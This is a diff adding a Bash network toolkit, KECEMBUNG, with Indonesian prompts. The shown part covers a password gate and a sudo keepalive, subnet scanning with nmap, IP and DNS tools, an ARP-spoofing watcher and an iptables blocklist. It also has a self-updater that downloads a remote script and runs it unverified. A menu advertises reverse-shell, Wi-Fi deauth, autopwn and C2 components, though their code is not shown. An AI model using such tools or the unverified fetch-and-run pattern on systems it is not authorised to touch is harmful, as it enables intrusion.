@@ -1,0 +1,4109 @@
+#!/bin/bash
+
+# =========================
+# 🎨 COLORS
+# =========================
+RED='\033[0;31m'
+GREEN='\033[0;32m'
+YELLOW='\033[1;33m'
+BLUE='\033[0;34m'
+CYAN='\033[0;36m'
+MAGENTA='\033[0;35m'
+NC='\033[0m'
+
+set +e
+set -o pipefail
+
+check_fail() {
+  if [ $? -ne 0 ]; then
+    echo "[!] ERROR: $1"
+  fi
+}
+
+CURRENT_PID=0
+CURRENT_CHILD=""
+RECOVERY_MODE=0
+INTERRUPTED=0
+RETURN_TO_MAIN=0
+CRASH_FLAG=0
+SCENARIO_MODE=0
+SCENARIO_DEPTH=0
+SUDO_SESSION_ACTIVE=0
+SUDO_KEEPALIVE_PID=""
+
+# =========================
+# 🧾 EASY OUTPUT SYSTEM
+# =========================
+
+print_section() {
+  echo ""
+  echo "=============================="
+  echo "$1"
+  echo "=============================="
+}
+
+print_keyval() {
+  printf "%-15s : %s\n" "$1" "$2"
+}
+
+print_success() {
+  echo "[✔] $1"
+}
+
+print_error() {
+  echo "[!] $1"
+}
+
+print_info() {
+  echo "[~] $1"
+}
+
+# =========================
+# 📁 KECEMBUNG BASE DIRECTORY
+# =========================
+BASE_DIR="$HOME/.kecembung"
+
+# =========================
+# 🤖 AI DIRECTORY
+# =========================
+AI_DIR="$BASE_DIR/ai"
+
+# =========================
+# 🎭 SCENARIO DIRECTORY
+# =========================
+SCENARIO_DIR="$HOME/.kecembung/scenarios"
+SCENARIO_BUILDER="$HOME/.kecembung/scenarios/scenario_builder.sh"
+
+# =========================
+# 🧠 AI PYTHON ENV
+# =========================
+AI_ENV="$HOME/kecembung-env"
+AI_PYTHON="$AI_ENV/bin/python"
+
+# =========================
+# 📝 LOG DIRECTORY
+# =========================
+LOG_DIR="$BASE_DIR/logs"
+RESULTS_DIR="$HOME/.kecembung/results"
+LOOT_DIR="$HOME/.kecembung/loot"
+SESSIONS_DIR="$HOME/.kecembung/sessions"
+CONFIG_FILE="$HOME/.kecembung/config"
+
+mkdir -p "$LOG_DIR" "$RESULTS_DIR" "$LOOT_DIR" "$SESSIONS_DIR"
+
+# =========================
+# 🧠 AI CHAT DIRECTORY
+# =========================
+AI_HISTORY_DIR="$BASE_DIR/ai/history"
+
+# =========================
+# 💾 STORAGE SYSTEM
+# =========================
+storage_mode="local"
+storage_path="$LOG_DIR"
+USB_PATH=""
+USB_SELECTED=0
+
+# =========================
+# 🔗 NEXUS DIRECTORY
+# =========================
+NEXUS_DIR="$BASE_DIR/nexus" 
+
+# =========================
+# 📂 AUTO CREATE DIRECTORY
+# =========================
+mkdir -p "$BASE_DIR"
+mkdir -p "$AI_DIR"
+mkdir -p "$SCENARIO_DIR"
+mkdir -p "$LOG_DIR"
+mkdir -p "$AI_HISTORY_DIR"
+mkdir -p "$NEXUS_DIR"
+
+# =========================
+# 📋 SOURCE MODE FLAG
+# =========================
+MODE_FILE="$HOME/.kecembung_mode"
+AI_DETECT_FLAG=0
+AI_TRAIN_FLAG=0
+AI_CHAT_FLAG=0
+SCENARIO_FLAG=0
+OLLAMA_FLAG=0
+OFFENSIVE_FLAG=0
+NEXUS_FLAG=0
+if [ -f "$MODE_FILE" ]; then
+  source "$MODE_FILE"
+  AI_DETECT_FLAG="${AI_DETECT:-0}"
+  AI_TRAIN_FLAG="${AI_TRAIN:-0}"
+  AI_CHAT_FLAG="${AI_CHAT:-0}"
+  SCENARIO_FLAG="${SCENARIO:-0}"
+  OLLAMA_FLAG="${OLLAMA:-0}"
+  OFFENSIVE_FLAG="${OFFENSIVE:-0}"
+  NEXUS_FLAG="${NEXUS:-0}"
+fi
+AI_DETECT="$AI_DIR/ai_detect.py"
+AI_TRAIN="$AI_DIR/ai_train.py"
+NEXUS_SCRIPT="$BASE_DIR/nexus/nexus.sh"
+
+# =========================
+# 🔐 START SUDO SESSION
+# =========================
+sudo_session_start() {
+
+    # Session sudah aktif
+    if [ "$SUDO_SESSION_ACTIVE" -eq 1 ]; then
+        return 0
+    fi
+
+    print_info "Administrator authentication required"
+
+    if ! sudo -v; then
+        print_error "Administrator authentication failed"
+        return 1
+    fi
+
+    (
+        while true; do
+            sudo -n true
+            sleep 60
+        done
+    ) >/dev/null 2>&1 &
+
+    SUDO_KEEPALIVE_PID=$!
+    SUDO_SESSION_ACTIVE=1
+
+    print_success "Administrator session started"
+}
+
+# =========================
+# 🔐 STOP SUDO SESSION
+# =========================
+sudo_session_stop() {
+
+    if [ "$SUDO_SESSION_ACTIVE" -eq 0 ]; then
+        return 0
+    fi
+
+    kill "$SUDO_KEEPALIVE_PID" >/dev/null 2>&1
+
+    sudo -k
+
+    SUDO_KEEPALIVE_PID=""
+    SUDO_SESSION_ACTIVE=0
+
+    print_success "Administrator session closed"
+}
+
+# =========================
+# ❤️ HEARTBEAT
+# =========================
+
+KECEMBUNG_DIR="$BASE_DIR"
+
+mkdir -p "$KECEMBUNG_DIR"
+
+HEARTBEAT_FILE="$KECEMBUNG_DIR/heartbeat"
+WATCHDOG_FILE="$KECEMBUNG_DIR/watchdog"
+
+write_heartbeat() {
+    echo "$(date +%s)" > "$HEARTBEAT_FILE"
+}
+
+safe_kill() {
+  local pid="$1"
+
+  if [ -z "$pid" ]; then
+    return
+  fi
+
+  PROCESS_MAIN=""
+  PROCESS_CHILD=""
+
+  kill "$pid" 2>/dev/null
+  sleep 0.5
+
+  kill -TERM "$pid" 2>/dev/null
+  sleep 1
+
+  kill -KILL "$pid" 2>/dev/null
+
+  wait "$pid" 2>/dev/null
+}
+
+kill_process() {
+  local pid="$1"
+
+  if [ -z "$pid" ]; then
+    return 0
+  fi
+
+  if ! kill -0 "$pid" 2>/dev/null; then
+    return 0
+  fi
+
+  safe_kill "$pid"
+}
+
+register_child() {
+  PROCESS_CHILD="$1"
+}
+
+# =========================
+# 🧠 PID SAFETY LAYER
+# =========================
+
+is_alive() {
+  [ -n "$1" ] && kill -0 "$1" 2>/dev/null
+}
+
+cleanup_child() {
+  if [ -n "$CURRENT_CHILD" ]; then
+    if ! kill -0 "$CURRENT_CHILD" 2>/dev/null; then
+      echo "[CLEANUP] stale CURRENT_CHILD removed ($CURRENT_CHILD)"
+      CURRENT_CHILD=""
+    fi
+  fi
+}
+
+validate_child() {
+  if [ -n "$CURRENT_CHILD" ] && ! kill -0 "$CURRENT_CHILD" 2>/dev/null; then
+    echo "[CLEANUP] stale CURRENT_CHILD removed ($CURRENT_CHILD)"
+    CURRENT_CHILD=""
+  fi
+}
+
+set_child() {
+  local pid="$1"
+
+  sleep 0.1
+
+  if [ -z "$pid" ] || ! kill -0 "$pid" 2>/dev/null; then
+    echo "[WARN] invalid CHILD PID"
+    CURRENT_CHILD=""
+    return 1
+  fi
+
+  CURRENT_CHILD="$pid"
+  return 0
+}
+
+# =========================
+# SAFE AI RUN
+# =========================
+
+safe_ai() {
+  local timeout="$1"
+  shift
+
+  setsid "$@" &
+  local pid=$!
+
+  set_child "$pid"
+
+  if [ -z "$CURRENT_CHILD" ]; then
+    echo "[!] SAFE AI: gagal spawn process"
+    return 1
+  fi
+
+  local start_time=$(date +%s)
+
+  while kill -0 "$CURRENT_CHILD" 2>/dev/null; do
+    write_heartbeat "AI_RUN"
+    sleep 2
+
+    if [ "$timeout" -gt 0 ]; then
+      now=$(date +%s)
+      diff=$((now - start_time))
+
+      if [ "$diff" -ge "$timeout" ]; then
+        echo "[!] SAFE AI: TIMEOUT ($timeout detik)"
+
+        kill_process "$CURRENT_CHILD"
+        wait "$CURRENT_CHILD" 2>/dev/null
+        CURRENT_CHILD=""
+
+        return 124
+      fi
+    fi
+  done
+
+  wait "$CURRENT_CHILD" 2>/dev/null
+  local status=$?
+
+  validate_child
+  CURRENT_CHILD=""
+
+  return $status
+}
+
+# =========================
+# AI Chat LLM
+# =========================
+
+AI_MODEL_DEFAULT="phi3:mini"
+AI_HISTORY_DIR="$HOME/kecembung_ai_history"
+mkdir -p "$AI_HISTORY_DIR"
+
+# =========================
+# SAFE MENU RUN
+# =========================
+safe_menu() {
+  set +e
+  "$@"
+  local status=$?
+
+  if [ $status -ne 0 ]; then
+    echo "[!] SAFE MENU: error di menu command"
+  fi
+
+  return $status
+}
+
+# =========================
+# SAFE BACKGROUND RUN
+# =========================
+safe_bg() {
+  set +e
+
+  "$@" &
+  local pid=$!
+
+  CURRENT_CHILD="$pid"
+
+  echo "[~] Background process started (PID: $pid)"
+
+  echo "$(date +%s)" > "$WATCHDOG_FILE"
+
+  echo $pid
+  return 0
+}
+
+# =========================
+# 🔄 UPDATE SYSTEM CONFIG
+# =========================
+CURRENT_VERSION="3.0.0"
+
+REPO_URL="https://raw.githubusercontent.com/arjunaabdurrahman/kecembung/main"
+
+VERSION_URL="$REPO_URL/version.txt"
+CHANGELOG_URL="$REPO_URL/changelog.txt"
+
+SCRIPT_URL="$REPO_URL/kecembung"
+
+UPDATE_URL="$REPO_URL/update.sh"
+
+AI_DETECT_URL="$REPO_URL/kecembung_/ai/ai_detect.py"
+AI_TRAIN_URL="$REPO_URL/kecembung_/ai/ai_train.py"
+
+SCENARIO_URL="$REPO_URL/kecembung_/scenario/scenario_builder.sh"
+
+INSTALLER_URL="$REPO_URL/install.sh"
+
+# =========================
+# 🔁 PROCESS TRACKING
+# =========================
+
+IN_MONITOR_MODE=0
+
+trap_ctrlc() {
+  if [ "$RECOVERY_MODE" -eq 1 ]; then
+    return
+  fi
+
+  if [ "$IN_MONITOR_MODE" -eq 1 ]; then
+    echo ""
+    echo "[!] CTRL+C → Kembali ke menu..."
+    IN_MONITOR_MODE=0
+    kill_process "$CURRENT_CHILD"
+    CURRENT_CHILD=""
+    return
+  fi
+
+  echo ""
+  echo "[!] CTRL+C DETECTED → RETURN TO MAIN MENU"
+
+  INTERRUPTED=1
+  RECOVERY_MODE=1
+  RETURN_TO_MAIN=1
+
+  kill_process "$CURRENT_CHILD"
+  kill_process "$CURRENT_PID"
+
+  CURRENT_CHILD=""
+  CURRENT_PID=0
+
+  validate_child
+}
+
+trap trap_ctrlc SIGINT
+trap sudo_session_stop EXIT
+
+reset_state() {
+  INTERRUPTED=0
+  RETURN_TO_MAIN=0
+  RECOVERY_MODE=0
+  CRASH_FLAG=0
+
+  if [ -n "$CURRENT_CHILD" ]; then
+    kill_process "$CURRENT_CHILD" 2>/dev/null
+  fi
+
+  CURRENT_CHILD=""
+  CURRENT_PID=0
+}
+
+# =========================
+# 🛡️ SELF-HEAL SAFE RUNNER
+# =========================
+
+safe_run() {
+  write_heartbeat "AI_RUN"
+  validate_child
+
+  local timeout_sec="$1"
+  shift
+  local cmd=("$@")
+
+  setsid "${cmd[@]}" &
+  local pid=$!
+
+  set_child "$pid"
+
+  if [ -z "$CURRENT_CHILD" ]; then
+    echo "[!] SAFE RUN: gagal spawn"
+    return 1
+  fi
+
+  local status=0
+
+  if [ "$timeout_sec" -gt 0 ]; then
+
+    for ((i=0; i<timeout_sec; i++)); do
+
+      if ! kill -0 "$CURRENT_CHILD" 2>/dev/null; then
+        wait "$CURRENT_CHILD" 2>/dev/null
+        status=$?
+        CURRENT_CHILD=""
+        return $status
+      fi
+
+      sleep 1
+
+      if [ "$RECOVERY_MODE" -eq 1 ]; then
+        kill_process "$CURRENT_CHILD"
+        wait "$CURRENT_CHILD" 2>/dev/null
+        CURRENT_CHILD=""
+        return 1
+      fi
+    done
+
+    echo "[!] SAFE RUN: timeout (${timeout_sec}s)"
+
+    kill_process "$CURRENT_CHILD"
+    wait "$CURRENT_CHILD" 2>/dev/null
+    CURRENT_CHILD=""
+
+    return 124
+  fi
+
+  wait "$CURRENT_CHILD" 2>/dev/null
+  status=$?
+
+  validate_child
+  CURRENT_CHILD=""
+
+  return $status
+}
+
+# =========================
+# 🛡️ UPDATE CHECK
+# =========================
+
+check_update() {
+  
+  echo ""
+  echo "[~] Mengecek update..."
+
+  ping -c 1 8.8.8.8 &>/dev/null || {
+    echo "[!] Tidak ada koneksi internet"
+    sleep 1
+    clear
+    return
+  }
+
+  HTTP_STATUS=$(curl -o /dev/null -s -w "%{http_code}" --max-time 5 "$VERSION_URL")
+
+  if [ "$HTTP_STATUS" != "200" ]; then
+    echo "[!] VERSION_URL tidak valid (HTTP $HTTP_STATUS)"
+    sleep 1
+    clear
+    return
+  fi
+
+  LATEST_VERSION=$(curl -s --max-time 5 "$VERSION_URL")
+
+  if [ -z "$LATEST_VERSION" ]; then
+    echo "[!] Gagal ambil versi terbaru (kosong)"
+    return
+  fi
+
+  LATEST_VERSION=$(echo "$LATEST_VERSION" | tr -d ' \n\r')
+
+  if [ "$LATEST_VERSION" != "$CURRENT_VERSION" ]; then
+
+    echo ""
+    echo "================================="
+    echo "⚠️ UPDATE TERSEDIA!"
+    echo "Versi kamu : $CURRENT_VERSION"
+    echo "Versi baru : $LATEST_VERSION"
+    echo ""
+
+    echo "Perubahan:"
+    curl -s --max-time 5 "$CHANGELOG_URL"
+    echo ""
+
+    echo "1. Update sekarang"
+    echo "2. Nanti"
+    echo "================================="
+
+    IFS= read -r -p "Pilih: " pilih
+
+    case "$pilih" in
+      1) do_update ;;
+      2) echo "[~] Melewati update..."
+         sleep 1
+         clear        
+         ;;
+      *) echo "[!] Pilihan tidak valid" ;;
+    esac
+
+  else
+    echo "[✔] Sudah versi terbaru"
+    sleep 1
+    clear
+  fi
+}
+
+do_update() {
+  UPDATE_SCRIPT="$HOME/.kecembung/update.sh"
+  mkdir -p "$HOME/.kecembung"
+
+  echo ""
+  echo "[~] Preparing update engine..."
+  curl -fsSL "$UPDATE_URL" -o "$UPDATE_SCRIPT"
+
+  if [ ! -s "$UPDATE_SCRIPT" ]; then
+    echo "[!] Gagal download update.sh"
+    return 1
+  fi
+
+  chmod +x "$UPDATE_SCRIPT"
+  clear
+  echo "[~] Launching KECEMBUNG updater..."
+  sleep 1
+
+  bash "$UPDATE_SCRIPT"
+  local status=$?
+
+  if [ $status -ne 0 ]; then
+    echo "[!] Update gagal"
+    return 1
+  fi
+
+  # =========================
+  # 🔍 CEK COMPONENT BARU
+  # =========================
+  MODE_FILE="$HOME/.kecembung_mode"
+  [ ! -f "$MODE_FILE" ] && touch "$MODE_FILE"
+  source "$MODE_FILE"
+
+  AI_DETECT=${AI_DETECT:-0}
+  AI_TRAIN=${AI_TRAIN:-0}
+  AI_CHAT=${AI_CHAT:-0}
+  SCENARIO=${SCENARIO:-0}
+  OFFENSIVE=${OFFENSIVE:-0}
+
+  # List component yang belum aktif
+  NEW_ITEMS=()
+  NEW_LABELS=()
+  NEW_KEYS=()
+
+  [ "$AI_DETECT" -eq 0 ] && NEW_ITEMS+=("AI Detect") && NEW_LABELS+=("Object detection via webcam, RTSP, image, video") && NEW_KEYS+=("1")
+  [ "$AI_TRAIN"  -eq 0 ] && NEW_ITEMS+=("AI Train")  && NEW_LABELS+=("Train custom YOLO models") && NEW_KEYS+=("2")
+  [ "$AI_CHAT"   -eq 0 ] && NEW_ITEMS+=("AI Chat")   && NEW_LABELS+=("Local LLM chat assistant via Ollama") && NEW_KEYS+=("3")
+  [ "$SCENARIO"  -eq 0 ] && NEW_ITEMS+=("Scenario Builder") && NEW_LABELS+=("Build & run automated scenarios") && NEW_KEYS+=("4")
+  [ "$OFFENSIVE" -eq 0 ] && NEW_ITEMS+=("Offensive Tools")  && NEW_LABELS+=("Nmap vuln, Masscan, R-Shell, Deauth, Autopwn") && NEW_KEYS+=("5")
+  [ "$NEXUS"     -eq 0 ] && NEW_ITEMS+=("NEXUS") && NEW_LABELS+=("Multi-node C2, Tactical FS, Operator Cast") && NEW_KEYS+=("6")
+
+  if [ ${#NEW_ITEMS[@]} -gt 0 ]; then
+    echo ""
+    echo -e "${CYAN}==================================================${NC}"
+    echo -e "${GREEN}      NEW COMPONENTS AVAILABLE${NC}"
+    echo -e "${CYAN}==================================================${NC}"
+    echo ""
+
+    for i in "${!NEW_ITEMS[@]}"; do
+      if [ "${NEW_ITEMS[$i]}" = "Offensive Tools" ]; then
+        echo -e "${RED}[${NEW_KEYS[$i]}] ${NEW_ITEMS[$i]}${NC}"
+      else
+        echo -e "${GREEN}[${NEW_KEYS[$i]}] ${NEW_ITEMS[$i]}${NC}"
+      fi
+      echo "    ${NEW_LABELS[$i]}"
+      echo ""
+    done
+
+    echo -e "${CYAN}==================================================${NC}"
+    echo -e "${YELLOW}Select components to install (example: 1 3 5)${NC}"
+    echo -e "${YELLOW}Type 'all' to install everything${NC}"
+    echo -e "${YELLOW}Or press ENTER to skip${NC}"
+    echo -e "${CYAN}==================================================${NC}"
+
+    IFS= read -r -p "Select: " selection </dev/tty
+
+    INSTALL_AI_DETECT=0
+    INSTALL_AI_TRAIN=0
+    INSTALL_AI_CHAT=0
+    INSTALL_SCENARIO=0
+    INSTALL_OFFENSIVE=0
+
+    if [ -n "$selection" ]; then
+      if [ "$selection" = "all" ]; then
+        [ "$AI_DETECT" -eq 0 ]  && INSTALL_AI_DETECT=1
+        [ "$AI_TRAIN" -eq 0 ]   && INSTALL_AI_TRAIN=1
+        [ "$AI_CHAT" -eq 0 ]    && INSTALL_AI_CHAT=1
+        [ "$SCENARIO" -eq 0 ]   && INSTALL_SCENARIO=1
+        [ "$OFFENSIVE" -eq 0 ] && INSTALL_OFFENSIVE=1
+        [ "$NEXUS" -eq 0 ] && INSTALL_NEXUS=1
+      else
+        for num in $selection; do
+          case $num in
+            1) [ "$AI_DETECT" -eq 0 ]  && INSTALL_AI_DETECT=1 ;;
+            2) [ "$AI_TRAIN" -eq 0 ]   && INSTALL_AI_TRAIN=1 ;;
+            3) [ "$AI_CHAT" -eq 0 ]    && INSTALL_AI_CHAT=1 ;;
+            4) [ "$SCENARIO" -eq 0 ]   && INSTALL_SCENARIO=1 ;;
+            5) [ "$OFFENSIVE" -eq 0 ]  && INSTALL_OFFENSIVE=1 ;;
+            6) [ "$NEXUS" -eq 0 ] && INSTALL_NEXUS=1 ;;
+          esac
+        done
+      fi
+
+      # Jalankan install component yang dipilih
+      if [ "$INSTALL_AI_DETECT" -eq 1 ] || [ "$INSTALL_AI_TRAIN" -eq 1 ] || [ "$INSTALL_AI_CHAT" -eq 1 ] || [ "$INSTALL_SCENARIO" -eq 1 ] || [ "$INSTALL_OFFENSIVE" -eq 1 ] || [ "$INSTALL_NEXUS" -eq 1 ]; then
+        echo ""
+        echo -e "${GREEN}[~] Installing selected components...${NC}"
+        
+        # Panggil ulang installer tapi mode silent component only
+        KECEMBUNG_UPDATE_MODE=1 \
+        INSTALL_AI_DETECT=$INSTALL_AI_DETECT \
+        INSTALL_AI_TRAIN=$INSTALL_AI_TRAIN \
+        INSTALL_AI_CHAT=$INSTALL_AI_CHAT \
+        INSTALL_SCENARIO=$INSTALL_SCENARIO \
+        INSTALL_OFFENSIVE=$INSTALL_OFFENSIVE \
+        INSTALL_NEXUS=$INSTALL_NEXUS \
+        bash "$HOME/.kecembung/install.sh"
+      fi
+    fi
+  fi
+
+  echo ""
+  echo "[✔] Update selesai"
+  echo "[~] Restarting KECEMBUNG..."
+  sleep 2
+  exec "$0"
+}
+
+# =========================
+# 🔐 SYSTEM CHECK
+# =========================
+
+if ! command -v sudo >/dev/null 2>&1; then
+    echo "[!] sudo tidak tersedia"
+    exit 1
+fi
+
+# =========================
+# 🔐 PASSWORD PROTECTION
+# =========================
+
+PASS_FILE="$HOME/.kecembung_pass"
+
+mkdir -p "$(dirname "$PASS_FILE")"
+
+if [ -f "$PASS_FILE" ]; then
+  chmod 600 "$PASS_FILE"
+fi
+
+PASS_DIR="$(dirname "$PASS_FILE")"
+mkdir -p "$PASS_DIR"
+
+if [ ! -f "$PASS_FILE" ]; then
+  echo "[!] Password belum diset. Jalankan installer dulu."
+  exit 1
+fi
+
+echo ""
+read -s -p "Masukkan Password KECEMBUNG: " input
+echo ""
+
+if [ -z "$input" ]; then
+  echo "[!] Password tidak boleh kosong"
+  exit 1
+fi
+
+INPUT_HASH=$(echo -n "$input" | sha256sum | awk '{print $1}')
+read -r STORED_HASH < "$PASS_FILE"
+
+if [ "$INPUT_HASH" != "$STORED_HASH" ]; then
+  echo "[!] Password salah"
+  exit 1
+fi
+
+echo "[✔] Akses diterima"
+echo ""
+
+sleep 1
+
+if ! sudo_session_start; then
+  exit 1
+fi
+
+check_update
+
+# =========================
+# 💾 STORAGE SYSTEM
+# =========================
+storage_mode="local"
+storage_path="$HOME/kecembung_logs"
+
+USB_PATH=""
+USB_SELECTED=0
+
+SCENARIO_DIR="$HOME/.kecembung/scenarios"
+mkdir -p "$SCENARIO_DIR"
+
+init_storage() {
+
+  if [ -z "$storage_mode" ]; then
+    storage_mode="local"
+  fi
+
+  if [ "$storage_mode" = "local" ]; then
+    storage_path="$LOG_DIR"
+  else
+    if [ -z "$USB_PATH" ]; then
+      storage_mode="local"
+      storage_path="$LOG_DIR"
+    else
+      storage_path="$USB_PATH/KECEMBUNG"
+    fi
+  fi
+
+  if [ -z "$storage_path" ] || [ "$storage_path" = "/" ]; then
+    storage_path="$HOME/kecembung_logs"
+  fi
+
+  mkdir -p "$storage_path"
+  mkdir -p "$storage_path/captures"
+}
+
+log_save() {
+  init_storage
+
+  if [ ! -w "$storage_path" ]; then
+    echo "[!] Storage not writable"
+    return 1
+  fi
+
+  echo "[$(date '+%F %T')] $1" >> "$LOG_DIR/kecembung_log.txt" 2>/dev/null
+
+  if [ $? -ne 0 ]; then
+    echo "[!] Failed to write log"
+  fi
+}
+
+log() {
+  log_save "$1"
+}
+
+# =========================
+# COMMAND MAP - IP TOOLS
+# =========================
+
+cmd_lihat_ip() {
+  clear
+  print_section "NETWORK INTERFACE STATUS"
+
+  ip -brief address | while read -r line; do
+    iface=$(echo "$line" | awk '{print $1}')
+    state=$(echo "$line" | awk '{print $2}')
+    ipaddr=$(echo "$line" | awk '{print $3}')
+
+    print_keyval "Interface" "$iface"
+    print_keyval "Status" "$state"
+    print_keyval "IP" "${ipaddr:-NONE}"
+    echo ""
+  done
+
+  read -p "Tekan ENTER untuk kembali..."
+}
+
+cmd_scan_jaringan() {
+  init_storage
+
+  if ! command -v nmap >/dev/null 2>&1; then
+    print_error "nmap belum terinstall"
+    return
+  fi
+
+  ipku=$(ip route get 8.8.8.8 | awk '{print $7}')
+  net=$(echo "$ipku" | cut -d '.' -f1-3).0/24
+
+  clear
+
+  print_section "NETWORK SCAN"
+  print_keyval "Subnet" "$net"
+  echo ""
+
+  print_info "Scanning network... tunggu sebentar"
+  echo ""
+
+  nmap -sn "$net" | awk '
+    /Nmap scan report/ {print "\n- " $NF}
+    /MAC Address/ {print "  MAC: " $0}
+  '
+
+  echo ""
+  read -p "Tekan ENTER untuk kembali..."
+}
+
+cmd_ping_ip() {
+  init_storage
+
+  read -p "Target IP: " target
+
+  if [ -z "$target" ]; then
+    print_error "Target kosong"
+    return
+  fi
+
+  print_section "PING TEST"
+  print_keyval "Target" "$target"
+  echo ""
+
+  result=$(ping -c 4 "$target")
+
+  loss=$(echo "$result" | grep -oP '\d+(?=% packet loss)')
+  avg=$(echo "$result" | grep -oP 'rtt .* = .*\/\K[0-9.]+')
+
+  if [[ "$loss" == "0" ]]; then
+    print_success "HOST ONLINE"
+  else
+    print_error "PACKET LOSS: $loss%"
+  fi
+
+  print_keyval "Avg Latency" "${avg:-unknown} ms"
+
+  read -p "Tekan ENTER untuk kembali..."
+}
+
+cmd_set_ip_manual() {
+  if ! command -v nmcli >/dev/null 2>&1; then
+    print_error "nmcli tidak tersedia di sistem ini"
+    return
+  fi
+
+  koneksi=$(nmcli -t -f NAME,DEVICE con show --active | grep -E "wlp|eno|eth" | head -n 1 | cut -d: -f1)
+
+  read -p "IP (contoh 192.168.1.10/24): " ipbaru
+  read -p "Gateway: " gateway
+
+  nmcli con mod "$koneksi" ipv4.addresses "$ipbaru"
+  nmcli con mod "$koneksi" ipv4.gateway "$gateway"
+  nmcli con mod "$koneksi" ipv4.method manual
+  nmcli con up "$koneksi"
+
+  print_section "IP CONFIGURATION"
+  print_success "IP berhasil diubah"
+  print_keyval "Interface" "$koneksi"
+  print_keyval "IP Baru" "$ipbaru"
+  print_keyval "Gateway" "$gateway"
+
+  read -p "Tekan ENTER untuk kembali..."
+}
+
+cmd_routing() {
+  print_section "ROUTING INFORMATION"
+
+  gateway=$(ip route | grep default | awk '{print $3}')
+  iface=$(ip route | grep default | awk '{print $5}')
+
+  print_keyval "Default Gateway" "$gateway"
+  print_keyval "Active Interface" "$iface"
+
+  echo ""
+  echo "ROUTES:"
+
+  ip route | grep -v default | while read -r line; do
+    echo "- $line"
+  done
+
+  echo ""
+  read -p "Tekan ENTER untuk kembali..."
+}
+
+cmd_dns_check() {
+  print_section "DNS STATUS"
+
+  dns=$(resolvectl status 2>/dev/null | grep "DNS Servers" -A2)
+
+  if [ -z "$dns" ]; then
+    print_error "DNS tidak terbaca"
+    return
+  fi
+
+  echo "$dns" | while read -r line; do
+    echo "- $line"
+  done
+
+  echo ""
+  read -p "Tekan ENTER untuk kembali..."
+}
+
+cmd_internet_check() {
+  print_section "INTERNET TEST"
+
+  echo "[~] Testing connection to 8.8.8.8..."
+
+  result=$(ping -c 2 8.8.8.8)
+
+  loss=$(echo "$result" | grep -oP '\d+(?=% packet loss)')
+  avg=$(echo "$result" | grep -oP 'rtt .* = .*\/\K[0-9.]+')
+
+  if [[ "$loss" == "0" ]]; then
+    print_success "INTERNET CONNECTED"
+  else
+    print_error "PACKET LOSS: $loss%"
+  fi
+
+  print_keyval "Latency" "${avg:-unknown} ms"
+
+  echo ""
+  read -p "Tekan ENTER untuk kembali..."
+}
+
+cmd_scan_ssh() {
+  if ! command -v nmap >/dev/null 2>&1; then
+    print_error "nmap belum terinstall"
+    return
+  fi
+
+  ipku=$(ip route get 8.8.8.8 | awk '{print $7}')
+  net=$(echo "$ipku" | cut -d '.' -f1-3).0/24
+
+  print_section "SSH SCAN"
+  print_keyval "Subnet" "$net"
+  echo ""
+
+  echo "[~] Searching SSH devices (port 22)..."
+  echo ""
+
+  nmap -p 22 --open "$net" | awk '
+    /Nmap scan report/ {print "- " $NF}
+  '
+
+  echo ""
+  read -p "Tekan ENTER untuk kembali..."
+}
+
+cmd_ssh_connect() {
+  read -p "Target IP: " target
+  read -p "User: " user
+
+  print_section "SSH CONNECTION"
+
+  if [ -z "$target" ] || [ -z "$user" ]; then
+    print_error "Input tidak lengkap"
+    return
+  fi
+
+  print_keyval "Target" "$target"
+  print_keyval "User" "$user"
+  echo ""
+
+  ssh "$user@$target"
+
+  echo ""
+  read -p "Tekan ENTER untuk kembali..."
+}
+
+cmd_reset_ip() {
+  if ! command -v nmcli >/dev/null 2>&1; then
+    print_error "nmcli tidak tersedia"
+    return
+  fi
+
+  print_section "NETWORK RESET"
+
+  koneksi=$(nmcli -t -f NAME,DEVICE con show --active | grep -E "wlp|eth|eno" | head -n 1 | cut -d: -f1)
+
+  if [ -z "$koneksi" ]; then
+    print_error "Tidak ada koneksi aktif"
+    return
+  fi
+
+  print_keyval "Interface" "$koneksi"
+  echo ""
+
+  echo "[~] Switching to DHCP mode..."
+
+  sudo nmcli con mod "$koneksi" ipv4.method auto
+  sudo nmcli con mod "$koneksi" ipv4.addresses ""
+  sudo nmcli con mod "$koneksi" ipv4.gateway ""
+  sudo nmcli con mod "$koneksi" ipv4.dns ""
+
+  sudo nmcli con down "$koneksi"
+  sudo nmcli con up "$koneksi"
+
+  print_success "IP RESET SUCCESS"
+
+  echo ""
+  read -p "Tekan ENTER untuk kembali..."
+}
+
+cmd_arp_watch() {
+  IN_MONITOR_MODE=1
+  clear
+  print_section "ARP WATCH - DETEKSI ARP SPOOFING"
+  print_info "Memantau ARP table... CTRL+C untuk berhenti"
+  echo ""
+
+  declare -A arp_table
+
+  (
+    while true; do
+      clear
+      print_section "ARP WATCH - LIVE MONITOR"
+      echo ""
+
+      while IFS= read -r line; do
+        ip=$(echo "$line" | grep -oP '(\d+\.){3}\d+')
+        mac=$(echo "$line" | grep -oP '([0-9a-f]{2}:){5}[0-9a-f]{2}')
+        [ -z "$ip" ] || [ -z "$mac" ] && continue
+
+        if [ -n "${arp_table[$ip]}" ] && [ "${arp_table[$ip]}" != "$mac" ]; then
+          echo -e "${RED}[⚠] ANOMALI DETECTED!${NC}"
+          echo -e "${RED}    IP    : $ip${NC}"
+          echo -e "${RED}    MAC lama : ${arp_table[$ip]}${NC}"
+          echo -e "${RED}    MAC baru : $mac${NC}"
+          echo "[$(date '+%F %T')] ANOMALI: $ip MAC berubah ${arp_table[$ip]} -> $mac" >> "$LOG_DIR/arp_watch.log"
+        else
+          echo -e "${GREEN}[✔]${NC} $ip  →  $mac"
+        fi
+
+        arp_table[$ip]="$mac"
+      done < <(ip neigh show 2>/dev/null)
+
+      echo ""
+      print_info "Refresh tiap 3 detik... CTRL+C untuk berhenti"
+      sleep 3
+    done
+  ) &
+
+  CURRENT_CHILD=$!
+  wait "$CURRENT_CHILD" 2>/dev/null
+
+  IN_MONITOR_MODE=0
+}
+
+cmd_ip_blocklist() {
+  clear
+  print_section "IP BLOCKLIST - FIREWALL MANAGER"
+
+  echo "1. Block IP"
+  echo "2. Lihat IP yang diblock"
+  echo "3. Unblock IP"
+  echo "4. Kembali"
+  echo ""
+
+  read -p "Pilih: " opt
+
+  case $opt in
+    1)
+      read -p "IP yang mau diblock: " ip
+      if [ -z "$ip" ]; then
+        print_error "IP tidak boleh kosong"
+        return
+      fi
+      sudo iptables -A INPUT -s "$ip" -j DROP
+      sudo iptables -A OUTPUT -d "$ip" -j DROP
+      print_success "IP $ip berhasil diblock"
+      echo "[$(date '+%F %T')] BLOCK: $ip" >> "$LOG_DIR/blocklist.log"
+      ;;
+
+    2)
+      print_section "DAFTAR IP YANG DIBLOCK"
+      echo ""
